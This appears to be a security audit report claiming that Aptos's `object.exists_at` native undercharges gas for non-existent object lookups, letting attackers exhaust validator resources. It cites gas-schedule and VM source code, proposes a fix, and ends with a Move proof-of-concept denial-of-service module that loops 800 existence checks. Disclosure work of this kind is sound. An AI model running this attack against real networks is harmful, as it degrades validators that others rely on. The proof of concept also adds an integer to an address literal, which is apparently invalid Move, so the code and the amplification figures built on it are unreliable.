# Audit Report

## Title
Massive Gas Undercharging for Non-Existent Object Lookups Enables Validator Resource Exhaustion

## Summary
The `object.exists_at` native function severely undercharges gas for checking non-existent objects—by approximately 99%—creating a ~125x amplification factor for attacking validator resources. Attackers can spam transactions that perform cheap existence checks on non-existent storage locations, forcing validators to perform expensive database lookups while paying minimal gas costs.

## Finding Description

The gas parameters for `object.exists_at` are configured as "dummy values" that do not reflect the actual storage I/O costs incurred by validators. [1](#0-0) 

The parameters are set to:
- `base: 919`
- `per_item_loaded: 1470`  
- `per_byte_loaded: 183`

However, the actual storage I/O costs defined in the transaction gas schedule are: [2](#0-1) 

For a **non-existent object** (0 bytes loaded), the function charges:
- Total: `919 + 1470 + 0 = 2,389 gas`

But the actual storage cost should be approximately:
- Storage slot read: `302,385 gas`

This creates a **~99% undercharge** (charges only 0.79% of actual cost).

The native implementation only charges the configured parameters without accounting for actual storage I/O: [3](#0-2) 

When checking a non-existent resource, the storage system returns `bytes_loaded = 0`: [4](#0-3) 

The storage adapter always performs a full lookup regardless of existence: [5](#0-4) 

And the I/O pricing charges the same slot read cost for both existing and non-existent resources: [6](#0-5) 

**Attack Vector:**
1. Attacker creates transactions containing repeated calls to `object.exists_at` with non-existent addresses
2. Each call costs only 2,389 gas but forces validators to:
   - Traverse the Jellyfish Merkle Tree to confirm non-existence
   - Perform database I/O operations
   - Consume CPU cycles for tree navigation
3. With a transaction gas limit of ~2 million gas, an attacker can pack ~837 existence checks per transaction
4. Each validator must perform 837 full storage lookups but the attacker only pays for a fraction of the computational cost

## Impact Explanation

This is a **Medium severity** vulnerability per the Aptos bug bounty program, specifically qualifying as "Validator node slowdowns."

The impact includes:
- **Validator Resource Exhaustion**: Attackers can force validators to perform disproportionate amounts of storage I/O and tree traversal work
- **Network Degradation**: Sustained attacks could slow down block processing across all validators
- **Gas Market Distortion**: The actual computational cost far exceeds the charged gas, breaking the economic security model
- **Amplification Factor**: ~125x amplification (should pay 302,385 gas but only pays 2,389 gas)

While this doesn't directly compromise consensus safety or steal funds, it enables:
- Sustained denial-of-service attacks against validator infrastructure
- Increased operational costs for validators (higher I/O load, potential need for better hardware)
- Potential degradation of network performance during coordinated attacks

## Likelihood Explanation

**Likelihood: HIGH**

The attack is:
- **Trivial to execute**: Any user can call `object.exists_at` in Move code
- **Low cost**: Attackers pay minimal gas while consuming significant validator resources
- **No special permissions required**: Works from any user account
- **Difficult to detect**: Looks like legitimate object existence checking
- **Profitable**: Transaction fees paid are far below actual resource consumption

The only limiting factor is transaction throughput, but an attacker could submit many such transactions to sustain the attack over time.

## Recommendation

The gas parameters for `object.exists_at` must be updated to reflect actual storage I/O costs. The current "dummy values" comment indicates this was a known temporary measure that should be corrected.

**Recommended fix:**

Update the gas schedule parameters to properly account for storage I/O costs:

```rust
// In aptos-move/aptos-gas-schedule/src/gas_schedule/aptos_framework.rs
// Replace the dummy values with actual storage costs
[object_exists_at_base: InternalGas, { 7.. => "object.exists_at.base" }, 302_385], // Match storage_io_per_state_slot_read
[object_exists_at_per_byte_loaded: InternalGasPerByte, { 7.. => "object.exists_at.per_byte_loaded" }, 151], // Match storage_io_per_state_byte_read
[object_exists_at_per_item_loaded: InternalGas, { 7.. => "object.exists_at.per_item_loaded" }, 0], // Remove redundant per_item charge
```

**Alternative approach:** Modify the native implementation to automatically charge storage I/O gas through the gas meter's `charge_load_resource` mechanism, similar to how the interpreter handles resource loading: [7](#0-6) 

## Proof of Concept

```move
module attacker::dos_attack {
    use std::signer;
    use aptos_framework::object;
    
    /// Perform many existence checks on non-existent objects
    /// to consume validator resources while paying minimal gas
    public entry fun resource_exhaustion_attack(sender: &signer) {
        let i = 0;
        // With max gas ~2M, can fit ~837 checks at 2,389 gas each
        while (i < 800) {
            // Generate non-existent addresses
            let fake_addr = @0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcd00 + i;
            
            // Each call costs only 2,389 gas but forces full storage lookup
            // Validator must traverse Jellyfish Merkle Tree and perform I/O
            // Should cost ~302,385 gas based on actual storage costs
            let _ = object::exists_at<object::ObjectCore>(fake_addr);
            
            i = i + 1;
        };
    }
}
```

This PoC demonstrates:
- 800 existence checks per transaction
- Total gas charged: ~1,911,200 gas (800 × 2,389)
- Actual validator work equivalent to: ~241,908,000 gas (800 × 302,385)
- **Amplification factor: ~126.5x**

**Notes**

The vulnerability exists because the gas parameters were explicitly marked as "dummy value[s]" and never updated to reflect actual storage costs. The comment at lines 354-355 of the gas schedule file acknowledges these are temporary placeholder values copied from elsewhere without proper calibration. This breaks the fundamental invariant that gas costs should reflect computational resource consumption, enabling economic attacks against validator infrastructure.

### Citations

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/aptos_framework.rs (L350-356)
```rust
        [object_exists_at_base: InternalGas, { 7.. => "object.exists_at.base" }, 919],
        // Based on SHA3-256's cost
        [object_user_derived_address_base: InternalGas, { RELEASE_V1_12.. => "object.user_derived_address.base" }, 14704],

        // These are dummy value, they copied from storage gas in aptos-core/aptos-vm/src/aptos_vm_impl.rs
        [object_exists_at_per_byte_loaded: InternalGasPerByte, { 7.. => "object.exists_at.per_byte_loaded" }, 183],
        [object_exists_at_per_item_loaded: InternalGas, { 7.. => "object.exists_at.per_item_loaded" }, 1470],
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L89-104)
```rust
            storage_io_per_state_slot_read: InternalGasPerArg,
            { 0..=9 => "load_data.base", 10.. => "storage_io_per_state_slot_read"},
            // At the current mainnet scale, we should assume most levels of the (hexary) JMT nodes
            // in cache, hence target charging 1-2 4k-sized pages for each read. Notice the cost
            // of seeking for the leaf node is covered by the first page of the "value size fee"
            // (storage_io_per_state_byte_read) defined below.
            302_385,
        ],
        [
            storage_io_per_state_byte_read: InternalGasPerByte,
            { 0..=9 => "load_data.per_byte", 10.. => "storage_io_per_state_byte_read"},
            // Notice in the latest IoPricing, bytes are charged at 4k intervals (even the smallest
            // read will be charged for 4KB) to reflect the assumption that every roughly 4k bytes
            // might require a separate random IO upon the FS.
            151,
        ],
```

**File:** aptos-move/framework/src/natives/object.rs (L84-97)
```rust
    context.charge(OBJECT_EXISTS_AT_BASE)?;

    let (exists, num_bytes) = context.exists_at(address, type_).map_err(|err| {
        PartialVMError::new(StatusCode::VM_EXTENSION_ERROR).with_message(format!(
            "Failed to read resource: {:?} at {}. With error: {}",
            type_, address, err
        ))
    })?;

    if let Some(num_bytes) = num_bytes {
        context.charge(
            OBJECT_EXISTS_AT_PER_ITEM_LOADED + OBJECT_EXISTS_AT_PER_BYTE_LOADED * num_bytes,
        )?;
    }
```

**File:** third_party/move/move-vm/types/src/resolver.rs (L12-14)
```rust
pub fn resource_size(resource: &Option<Bytes>) -> usize {
    resource.as_ref().map(|bytes| bytes.len()).unwrap_or(0)
}
```

**File:** aptos-move/aptos-vm/src/data_cache.rs (L122-128)
```rust
            let state_key = resource_state_key(address, struct_tag)?;
            let buf = self
                .executor_view
                .get_resource_bytes(&state_key, maybe_layout)?;
            let buf_size = resource_size(&buf);
            Ok((buf, buf_size))
        }
```

**File:** aptos-move/aptos-vm-types/src/storage/io_pricing.rs (L167-172)
```rust
    fn calculate_read_gas(
        &self,
        loaded: NumBytes,
    ) -> impl GasExpression<VMGasParameters, Unit = InternalGasUnit> + use<> {
        STORAGE_IO_PER_STATE_SLOT_READ * NumArgs::from(1) + STORAGE_IO_PER_STATE_BYTE_READ * loaded
    }
```

**File:** third_party/move/move-vm/runtime/src/interpreter.rs (L1344-1356)
```rust
        let (gv, bytes_loaded) =
            data_cache.load_resource(gas_meter, traversal_context, &addr, ty)?;
        if let Some(bytes_loaded) = bytes_loaded {
            gas_meter.charge_load_resource(
                addr,
                TypeWithRuntimeEnvironment {
                    ty,
                    runtime_environment: self.loader.runtime_environment(),
                },
                gv.view(),
                bytes_loaded,
            )?;
        }
```
